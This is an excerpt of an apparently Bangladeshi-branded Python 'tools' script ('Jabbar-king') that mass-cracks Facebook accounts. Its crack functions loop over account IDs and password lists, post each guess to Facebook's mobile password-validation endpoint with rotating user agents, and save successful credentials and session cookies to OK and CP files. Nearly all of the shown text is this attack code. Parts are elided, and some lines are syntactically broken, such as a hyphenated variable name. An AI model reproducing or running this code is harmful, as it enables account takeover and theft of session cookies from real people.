...
def back():
    login()
def contact():
   # os.system('xdg-open https://www.facebook.com/Jabbar-king.King.Ok.Bro')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mMR-Jabbar-king ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • Jabbar-king King ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mJabbar-king-King ]   ║\33[1;34m   
...
os.system('espeak -a 300 " Welcome,   to,  Jabbar-king,  King,  Tools"')
pass
...
def menu():
    ...
    print('\033[0;97m=================')
    Jabbar-king = input('\x1b[1;92m[+] CHOOSE: ')
    if Jabbar-king in ['111']:
        login()
        dump_massal()
    elif Jabbar-king in ['1']:
        crack_file()
    elif Jabbar-king in ['2','02']:
        os.system('xdg-open https://wa.me/+8801608843956')
        os.system("python nono.py")
    elif Jabbar-king in ['3','03']:
        result()
    elif Jabbar-king in ['0']:
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[Jabbar-king•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[Jabbar-king-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[Jabbar-king-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " Jabbar-king,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[Jabbar-king-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•Jabbar-king-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•Jabbar-king-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  Jabbar-king,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
